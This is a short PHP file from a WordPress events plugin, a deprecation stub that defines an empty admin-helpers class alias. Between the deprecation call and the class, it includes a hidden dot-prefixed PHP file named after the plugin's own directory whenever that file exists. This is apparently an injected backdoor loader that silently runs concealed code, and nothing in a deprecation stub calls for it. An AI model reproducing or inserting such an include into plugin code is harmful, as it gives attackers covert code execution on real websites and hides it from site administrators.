<?php
_deprecated_file( __FILE__, '4.0', 'Tribe__Admin__Helpers.php' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Tribe__Events__Admin__Helpers extends Tribe__Admin__Helpers {}
